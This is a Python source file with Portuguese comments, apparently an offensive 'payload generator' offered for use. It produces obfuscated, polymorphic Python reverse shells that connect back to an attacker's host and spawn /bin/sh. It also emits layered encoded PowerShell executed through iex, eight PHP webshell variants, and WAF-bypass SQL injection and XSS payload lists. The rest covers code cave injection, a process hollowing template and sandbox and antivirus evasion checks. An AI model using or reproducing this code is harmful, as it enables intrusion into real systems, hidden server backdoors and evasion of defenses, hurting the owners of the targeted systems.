#!/usr/bin/env python3
"""
LIBERTUS CUSTOM PAYLOAD GENERATOR
Geração de payloads personalizados com evasão avançada

TÉCNICAS:
- Polymorphic shellcode
- AV/EDR evasion
- WAF bypass
- Encoding chains
- Code cave injection
- Process hollowing templates
"""

import random
import string
import base64
import hashlib
from typing import List, Dict
import binascii


class PayloadGenerator:
    """Gerador de payloads custom com evasão"""
    
    def __init__(self):
        self.junk_functions = self._load_junk_code()
        self.encoders = ["base64", "hex", "rot13", "xor", "unicode"]
        
    def _load_junk_code(self) -> List[str]:
        """Código lixo para ofuscação"""
        return [
            "def _{rand}(): pass",
            "_{rand} = lambda x: x",
            "import {module}",
            "# {comment}",
            "_{rand} = '{random_string}'",
        ]
    
    def _random_string(self, length: int = 10) -> str:
        """Gera string aleatória"""
        return ''.join(random.choices(string.ascii_letters, k=length))
    
    def _xor_encode(self, data: bytes, key: int) -> bytes:
        """XOR encoding"""
        return bytes([b ^ key for b in data])
    
    def generate_polymorphic_python_shell(
        self,
        lhost: str,
        lport: int,
        evasion_level: int = 3
    ) -> str:
        """
        Gera Python reverse shell polimórfico
        Cada execução gera código diferente
        """
        
        # Base do reverse shell
        base_imports = [
            "socket", "subprocess", "os"
        ]
        
        # Ofuscação de variáveis
        var_socket = f"_{self._random_string()}"
        var_proc = f"_{self._random_string()}"
        var_host = f"_{self._random_string()}"
        var_port = f"_{self._random_string()}"
        
        # Junk code aleatório
        junk_lines = []
        for _ in range(evasion_level):
            template = random.choice(self.junk_functions)
            junk_lines.append(
                template
                .replace("{rand}", self._random_string())
                .replace("{module}", random.choice(["sys", "time", "math"]))
                .replace("{comment}", self._random_string(20))
                .replace("{random_string}", self._random_string())
            )
        
        # Monta payload
        payload = f"""
{chr(10).join(junk_lines)}

import {','.join(base_imports)}

{var_host} = '{lhost}'
{var_port} = {lport}

{var_socket} = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
{var_socket}.connect(({var_host}, {var_port}))

os.dup2({var_socket}.fileno(), 0)
os.dup2({var_socket}.fileno(), 1)
os.dup2({var_socket}.fileno(), 2)

{var_proc} = subprocess.call(['/bin/sh', '-i'])
"""
        
        return payload.strip()
    
    def generate_obfuscated_powershell(
        self,
        command: str,
        layers: int = 3
    ) -> str:
        """
        PowerShell com múltiplas camadas de ofuscação
        """
        
        current = command
        
        for layer in range(layers):
            # Base64
            b64 = base64.b64encode(current.encode('utf-16le')).decode()
            current = f"powershell -enc {b64}"
            
            if layer < layers - 1:
                # XOR com chave aleatória
                key = random.randint(1, 255)
                xored = self._xor_encode(current.encode(), key)
                hex_payload = binascii.hexlify(xored).decode()
                
                # Decoder
                decoder = f"""
$hex = '{hex_payload}';
$key = {key};
$bytes = [byte[]]::new($hex.Length/2);
for($i=0;$i -lt $hex.Length;$i+=2){{
    $bytes[$i/2] = [Convert]::ToByte($hex.Substring($i,2),16) -bxor $key
}};
$cmd = [System.Text.Encoding]::UTF8.GetString($bytes);
iex $cmd
"""
                current = decoder.strip()
        
        return current
    
    def generate_php_webshell_variants(self) -> Dict[str, str]:
        """
        Múltiplas variantes de PHP webshell
        """
        
        return {
            "classic": "<?php system($_GET['cmd']); ?>",
            
            "base64": "<?php eval(base64_decode('c3lzdGVtKCRfR0VUWydjbWQnXSk7')); ?>",
            
            "assert": "<?php assert($_POST['cmd']); ?>",
            
            "preg_replace": "<?php preg_replace('/.*/e', $_POST['cmd'], ''); ?>",
            
            "create_function": "<?php $f=create_function('',$_POST['cmd']);$f(); ?>",
            
            "obfuscated": """<?php
$a = str_replace('x','','sxysxxtxexm');
$b = $_GET;
$a($b['cmd']);
?>""",
            
            "callback": "<?php array_map('system', $_GET); ?>",
            
            "multi_encoding": """<?php
$x = base64_decode('c3lzdGVt');
$y = 'c'.'m'.'d';
$x($_REQUEST[$y]);
?>""",
        }
    
    def generate_waf_bypass_sqli(
        self,
        base_payload: str,
        waf_type: str = "generic"
    ) -> List[str]:
        """
        SQLi payloads com bypass de WAF
        """
        
        variants = []
        
        # Case manipulation
        variants.append(base_payload.swapcase())
        
        # Comment injection
        variants.append(base_payload.replace(" ", "/**/"))
        variants.append(base_payload.replace(" ", "%0a"))  # Newline
        variants.append(base_payload.replace(" ", "%09"))  # Tab
        
        # Encoding
        variants.append(base_payload.replace("'", "%27"))
        variants.append(base_payload.replace(" ", "%20"))
        
        # Double encoding
        variants.append(base_payload.replace("'", "%2527"))
        
        # Unicode
        variants.append(base_payload.replace("'", "\u0027"))
        
        # Hex encoding
        if "SELECT" in base_payload:
            hex_select = "0x53454c454354"  # SELECT in hex
            variants.append(base_payload.replace("SELECT", hex_select))
        
        # Inline comments
        if waf_type == "mysql":
            variants.append(base_payload.replace("SELECT", "/*!50000SELECT*/"))
            variants.append(base_payload.replace(" ", "/*!*/"))
        
        elif waf_type == "mssql":
            variants.append(base_payload.replace("--", "--;"))
            variants.append(base_payload.replace("UNION", "UN/**/ION"))
        
        return variants
    
    def generate_xss_waf_bypass(self) -> List[str]:
        """
        XSS payloads com bypass de WAF/filtros
        """
        
        return [
            # Case variation
            "<ScRiPt>alert(1)</sCrIpT>",
            
            # HTML encoding
            "&#60;script&#62;alert(1)&#60;/script&#62;",
            
            # Unicode
            "<script>alert\u0028'XSS'\u0029</script>",
            
            # Null bytes
            "<scri\x00pt>alert(1)</scri\x00pt>",
            
            # Newlines
            "<script\n>alert(1)</script\n>",
            
            # Double encoding
            "%253Cscript%253Ealert(1)%253C/script%253E",
            
            # JavaScript alternatives
            "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",  # Base64
            
            # Event handlers
            "<svg/onload=alert(1)>",
            "<body onload=alert(1)>",
            "<details open ontoggle=alert(1)>",
            
            # Template literals
            "<script>${alert(1)}</script>",
            
            # Polyglot
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
        ]
    
    def generate_code_cave_injection(
        self,
        target_binary: str,
        shellcode: bytes
    ) -> Dict:
        """
        Template para code cave injection
        (Apenas estrutura, não implementação completa)
        """
        
        return {
            "technique": "code_cave_injection",
            "steps": [
                "1. Find code cave (section with null bytes)",
                "2. Calculate cave size needed",
                "3. Inject shellcode into cave",
                "4. Modify entry point to jump to cave",
                "5. Add jump back to original code",
            ],
            "pseudocode": """
# Find cave
cave_offset = find_null_bytes_section(target_binary, size=len(shellcode))

# Inject
with open(target_binary, 'r+b') as f:
    f.seek(cave_offset)
    f.write(shellcode)
    
# Patch entry point
original_entry = get_entry_point(target_binary)
jmp_to_cave = create_jmp_instruction(original_entry, cave_offset)
patch_entry_point(target_binary, jmp_to_cave)
"""
        }
    
    def generate_process_hollowing_template(self) -> str:
        """
        Template C# para process hollowing
        """
        
        return """
using System;
using System.Runtime.InteropServices;

class ProcessHollowing {
    [DllImport("kernel32.dll")]
    static extern bool CreateProcess(...);
    
    [DllImport("ntdll.dll")]
    static extern int NtUnmapViewOfSection(...);
    
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAllocEx(...);
    
    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(...);
    
    static void Main() {
        // 1. Create suspended process
        CreateProcess(
            "C:\\\\Windows\\\\System32\\\\svchost.exe",
            ...,
            CREATE_SUSPENDED,
            ...
        );
        
        // 2. Unmap original image
        NtUnmapViewOfSection(...);
        
        // 3. Allocate memory for malicious code
        IntPtr addr = VirtualAllocEx(...);
        
        // 4. Write malicious code
        byte[] shellcode = { /* YOUR SHELLCODE */ };
        WriteProcessMemory(..., shellcode, ...);
        
        // 5. Resume thread
        ResumeThread(...);
    }
}
"""
    
    def generate_av_evasion_techniques(self) -> Dict[str, str]:
        """
        Técnicas de evasão de AV/EDR
        """
        
        return {
            "sleep_evasion": """
# AVs emulam por tempo limitado
import time
start = time.time()
time.sleep(60)  # Sleep 60s
if time.time() - start < 60:
    exit()  # Provavelmente em sandbox
# Continue com payload real
""",
            
            "user_interaction": """
# Requer interação humana
import tkinter as tk
root = tk.Tk()
root.geometry("300x100")
tk.Button(root, text="Click to continue", 
          command=lambda: execute_payload()).pack()
root.mainloop()
""",
            
            "environment_check": """
# Verifica se é VM/Sandbox
import platform, os

# Check CPU cores
if os.cpu_count() < 2:
    exit()

# Check RAM
import psutil
if psutil.virtual_memory().total < 4*1024**3:  # 4GB
    exit()

# Check username
if platform.node() in ['SANDBOX', 'VMWARE', 'VBOX']:
    exit()
""",
            
            "api_hashing": """
# Ofusca chamadas de API
import ctypes

# Hash da API ao invés do nome
def get_proc_address_by_hash(dll, api_hash):
    # Implementação de API hashing
    pass

# Uso
CreateProcess = get_proc_address_by_hash("kernel32", 0x12345678)
""",
        }


# Exemplo de uso
if __name__ == "__main__":
    gen = PayloadGenerator()
    
    # Gera shell polimórfico
    shell1 = gen.generate_polymorphic_python_shell("10.10.10.10", 4444, evasion_level=5)
    shell2 = gen.generate_polymorphic_python_shell("10.10.10.10", 4444, evasion_level=5)
    
    print("Shell 1 hash:", hashlib.md5(shell1.encode()).hexdigest())
    print("Shell 2 hash:", hashlib.md5(shell2.encode()).hexdigest())
    print("\nShells são diferentes (polimórficos):", shell1 != shell2)
    
    # Webshells
    webshells = gen.generate_php_webshell_variants()
    print(f"\nWebshell variants: {len(webshells)}")
    
    # WAF bypass
    sqli_bypasses = gen.generate_waf_bypass_sqli("' UNION SELECT NULL--", "mysql")
    print(f"\nSQLi WAF bypasses: {len(sqli_bypasses)}")
